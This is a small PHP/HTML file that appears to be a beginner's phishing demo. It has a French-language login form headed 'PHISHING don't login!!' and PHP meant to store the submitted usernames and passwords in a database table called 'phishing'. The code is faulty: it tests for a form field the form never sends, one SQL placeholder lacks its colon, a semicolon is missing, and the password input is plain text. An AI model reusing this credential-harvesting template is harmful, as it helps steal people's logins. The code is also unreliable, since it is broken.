<?php

    $username = " ";
    $password = " ";

?>

<!DOCTYPE html>
<html>

    <head>
        <title>LOGIN</title>
        <meta charset="utf-8">
    </head>
    <body>

        <style>
            #div{
                border: solid;
                border-radius: 2px;
                border: outset black;
                width: 250px;
                height: 100px;



            }
        </style>
        <center>
            <h1 style="text-align center">PHISHING don't login!!</h1>
            <div id="div">
                <br>
                    <form method="post">
                        <input type="text" name="Username" id="name" placeholder="Nom d'utilisateur"><br>
                        <input type="text" name="Password" id="password"placeholder="Mot de passe"><br>
                        <input type="submit" name="login" id="login">
                    </form>
            </div>
        </center>


        <?php

            if(isset($_POST['formsend'])){
                extract($_POST);

                include 'database.php';
                global $db;

                $q = $db ->prepare("INSERT INTO phishing(Username,Password) VALUES(:Username,Password)");
                $q ->execute([
                    'Username' => $Username,
                    'Password' => $Password

                ])
            }

        
        ?>
    </body>



</html>

